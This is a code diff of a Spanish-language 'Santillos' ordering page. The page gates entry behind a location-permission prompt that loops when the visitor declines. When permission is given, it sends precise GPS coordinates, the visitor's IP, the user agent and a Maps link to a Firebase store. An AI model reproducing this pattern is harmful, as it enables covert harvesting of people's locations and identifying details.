@@ -1,146 +1,63 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Santillos</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif}
-body{background:#0f0f0f;color:#fff;min-height:100vh}
-.fondo-demo{filter:brightness(0.4);background:url('https://images.unsplash.com/photo-1568909344668-6f14a07b56a0?w=500') center/cover;min-height:100vh;padding:20px}
-.header-demo{display:flex;justify-content:space-between;align-items:center;padding:10px}
-.logo-demo{width:80px;height:80px;background:#ffcc00;border-radius:50%}
-/* OVERLAYS */
+body{background:#0f0f0f}
 .overlay{position:fixed;inset:0;background:rgba(0,0,0,.78);backdrop-filter:blur(6px);z-index:9999;display:flex;align-items:center;justify-content:center;padding:18px}
-.card-location{background:#fff;border-radius:28px;padding:28px 22px 18px;width:100%;max-width:360px;text-align:center;animation:pop .3s ease;box-shadow:0 20px 50px rgba(0,0,0,.4)}
+.card-location{background:#fff;border-radius:28px;padding:28px 22px 18px;width:100%;max-width:360px;text-align:center;animation:pop .3s ease}
 @keyframes pop{0%{transform:scale(.85);opacity:0}100%{transform:scale(1);opacity:1}}
-.icon-pin{width:86px;height:86px;margin:0 auto 12px;position:relative}
-.icon-pin svg{width:100%;height:100%}
-.title{font-size:22px;font-weight:800;color:#111;line-height:1.2;margin-bottom:10px}
-.subtitle{font-size:14px;color:#444;line-height:1.5;margin-bottom:22px;font-weight:500}
-.btn-burgundy{width:100%;background:#5e0a28;border:none;color:#fff;padding:16px;border-radius:30px;font-weight:800;font-size:15px;cursor:pointer;box-shadow:0 8px 20px rgba(94,10,40,.35)}
-.btn-link{width:100%;background:none;border:none;color:#6b7280;padding:16px;font-weight:600;font-size:14px;cursor:pointer;margin-top:4px}
+.title{font-size:22px;font-weight:800;color:#111;margin-bottom:10px}
+.subtitle{font-size:14px;color:#444;line-height:1.5;margin-bottom:22px}
+.btn-burgundy{width:100%;background:#5e0a28;color:#fff;border:none;padding:16px;border-radius:30px;font-weight:800;font-size:15px;cursor:pointer}
+.btn-link{width:100%;background:none;border:none;color:#6b7280;padding:16px;font-weight:600;cursor:pointer}
 .btn-row{display:flex;gap:12px;margin-top:18px}
-.btn-si{flex:1;background:#e30613;color:#fff;border:none;padding:13px;border-radius:14px;font-weight:800;font-size:14px;cursor:pointer}
-.btn-no{flex:1;background:#00c853;color:#fff;border:none;padding:13px;border-radius:14px;font-weight:800;font-size:14px;cursor:pointer}
-#panelInicial{display:none;min-height:100vh;background:#fff;color:#111;padding:24px;text-align:center}
-#panelInicial h1{font-size:26px;font-weight:900;margin-top:40px}
-#panelInicial p{color:#666;margin-top:8px;font-size:14px}
-.badge-ok{background:#e8f5e9;color:#00c853;padding:6px 12px;border-radius:20px;font-size:11px;font-weight:800;display:inline-flex;margin-top:16px}
+.btn-si{flex:1;background:#e30613;color:#fff;border:none;padding:13px;border-radius:14px;font-weight:800;cursor:pointer}
+.btn-no{flex:1;background:#00c853;color:#fff;border:none;padding:13px;border-radius:14px;font-weight:800;cursor:pointer}
 </style>
 </head>
 <body>
-
-<div class="fondo-demo">
- <div class="header-demo"><div class="logo-demo"></div><div style="border:1.5px solid #22c55e;padding:6px 12px;border-radius:20px;font-size:11px;font-weight:800">ABIERTO</div></div>
- <div style="margin-top:30px;background:#1c1c1c;border-radius:18px;height:110px"></div>
- <div style="margin-top:12px;background:#1c1c1c;border-radius:18px;height:110px"></div>
- <div style="margin-top:12px;background:#1c1c1c;border-radius:18px;height:110px"></div>
-</div>
-
-<!-- TARJETA 1 : PERMITIR UBICACION -->
 <div class="overlay" id="overlayPermitir">
   <div class="card-location">
-    <div class="icon-pin">
-      <svg viewBox="0 0 80 90" fill="none"><path d="M40 0C18 0 0 18 0 40C0 65 40 90 40 90S80 65 80 40C80 18 62 0 40 0Z" fill="white" stroke="#111" stroke-width="3"/><ellipse cx="40" cy="82" rx="18" ry="4" fill="none" stroke="#b91c45" stroke-width="3"/><circle cx="40" cy="38" r="16" fill="#b91c45"/></svg>
-    </div>
+    <svg viewBox="0 0 80 90" style="width:86px;margin:0 auto 12px;display:block" fill="none"><path d="M40 0C18 0 0 18 0 40C0 65 40 90 40 90S80 65 80 40C80 18 62 0 40 0Z" fill="white" stroke="#111" stroke-width="3"/><ellipse cx="40" cy="82" rx="18" ry="4" fill="none" stroke="#b91c45" stroke-width="3"/><circle cx="40" cy="38" r="16" fill="#b91c45"/></svg>
     <div class="title">¿Permitir tu ubicación?</div>
     <div class="subtitle">Necesitamos conocer tu ubicación para que puedas iniciar tu pedido y ayudarte a encontrar la mejor opción de entrega.</div>
     <button class="btn-burgundy" onclick="permitirUbicacion()">Permitir ubicación</button>
     <button class="btn-link" onclick="mostrarConfirmacionNo()">Ahora no</button>
   </div>
 </div>
-
-<!-- TARJETA 2 : CONFIRMACION -->
 <div class="overlay" id="overlayConfirmar" style="display:none">
   <div class="card-location">
-    <div class="icon-pin">
-      <svg viewBox="0 0 80 90" fill="none"><path d="M40 0C18 0 0 18 0 40C0 65 40 90 40 90S80 65 80 40C80 18 62 0 40 0Z" fill="white" stroke="#111" stroke-width="3"/><ellipse cx="40" cy="82" rx="18" ry="4" fill="none" stroke="#111" stroke-width="3"/><text x="50%" y="48%" dominant-baseline="middle" text-anchor="middle" font-size="36" font-weight="900" fill="#111">!</text></svg>
-    </div>
     <div class="title">¿Estás seguro de que no deseas continuar?</div>
     <div class="subtitle">Sin tu ubicación no podremos mostrarte el menú ni calcular el costo de envío.</div>
     <div class="btn-row">
-      <button class="btn-si" onclick="mandarAGoogle()">Sí</button>
+      <button class="btn-si" onclick="window.location.href='https://www.google.com'">Sí</button>
       <button class="btn-no" onclick="volverAPedir()">No</button>
     </div>
   </div>
 </div>
-
-<div id="panelInicial">
-  <h1>¡Ubicación habilitada! ✅</h1>
-  <p>Panel inicial desbloqueado correctamente</p>
-  <div class="badge-ok">📍 Ubicación guardada en Firebase /ubicaciones</div>
-  <div id="infoUbicacion" style="margin-top:20px;background:#f5f5f7;padding:14px;border-radius:12px;text-align:left;font-size:12px;color:#333"></div>
-</div>
-
 <script>
 const firebaseConfig={apiKey:"AIzaSyD1eh7jbI-T43XvMErYsxi9C_fw4PI61oA",authDomain:"santillos-1ac6d.firebaseapp.com",databaseURL:"https://santillos-1ac6d-default-rtdb.firebaseio.com",projectId:"santillos-1ac6d",storageBucket:"santillos-1ac6d.firebasestorage.app",messagingSenderId:"285600299102",appId:"1:285600299102:web:9590597c2b3d8888821ccf"};
-firebase.initializeApp(firebaseConfig);
-const db=firebase.database();
-
-let ipCliente = "desconocida";
+firebase.initializeApp(firebaseConfig);const db=firebase.database();
+let ipCliente="desconocida";
 fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{ipCliente=d.ip}).catch(()=>{});
-
-function mostrarConfirmacionNo(){
-  document.getElementById('overlayPermitir').style.display='none';
-  document.getElementById('overlayConfirmar').style.display='flex';
-}
-function volverAPedir(){
-  document.getElementById('overlayConfirmar').style.display='none';
-  document.getElementById('overlayPermitir').style.display='flex';
-}
-function mandarAGoogle(){
-  window.location.href = "https://www.google.com";
-}
-
+function mostrarConfirmacionNo(){document.getElementById('overlayPermitir').style.display='none';document.getElementById('overlayConfirmar').style.display='flex';}
+function volverAPedir(){document.getElementById('overlayConfirmar').style.display='none';document.getElementById('overlayPermitir').style.display='flex';}
 function permitirUbicacion(){
-  if(!navigator.geolocation){
-    alert("Tu dispositivo no soporta GPS");
-    return;
-  }
+  if(!navigator.geolocation){ alert("No soporta GPS"); return; }
   navigator.geolocation.getCurrentPosition(async (pos)=>{
-    const lat = pos.coords.latitude;
-    const lng = pos.coords.longitude;
-    const acc = pos.coords.accuracy;
-
-    // Guardar en Firebase carpeta ubicaciones
-    const data = {
-      lat: lat,
-      lng: lng,
-      accuracy: acc,
-      ip: ipCliente,
-      userAgent: navigator.userAgent,
-      fecha: new Date().toLocaleString(),
-      timestamp: Date.now(),
-      maps: `https://www.google.com/maps?q=${lat},${lng}`
-    };
-
-    try{
-      await db.ref('ubicaciones').push(data);
-      console.log("Ubicación guardada", data);
-    }catch(e){ console.error(e); }
-
-    // Ocultar overlays y mostrar panel inicial
-    document.getElementById('overlayPermitir').style.display='none';
-    document.getElementById('overlayConfirmar').style.display='none';
-    document.getElementById('panelInicial').style.display='block';
-    document.getElementById('infoUbicacion').innerHTML = `
-      <b>Lat:</b> ${lat}<br>
-      <b>Lng:</b> ${lng}<br>
-      <b>IP:</b> ${ipCliente}<br>
-      <b>Precisión:</b> ${Math.round(acc)}m<br>
-      <b>Maps:</b> <a href="${data.maps}" target="_blank">Ver en Maps</a>
-    `;
-
-  }, (err)=>{
-    alert("Necesitas permitir la ubicación para continuar: " + err.message);
-    // lo vuelve a intentar
-    mostrarConfirmacionNo();
-  }, {enableHighAccuracy:true, timeout:15000});
+    const data={lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,ip:ipCliente,userAgent:navigator.userAgent,fecha:new Date().toLocaleString(),timestamp:Date.now(),maps:`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`};
+    try{ await db.ref('ubicaciones').push(data); localStorage.setItem('santillos_ubicacion',JSON.stringify(data)); localStorage.setItem('santillos_ubicacion_ok','1'); }catch(e){}
+    window.location.href="menu.html";
+  },()=>{mostrarConfirmacionNo();},{enableHighAccuracy:true,timeout:15000});
 }
+// Si ya dio permiso antes, mandar directo
+if(localStorage.getItem('santillos_ubicacion_ok')==='1'){ window.location.href="menu.html"; }
 </script>
 </body>
 </html>
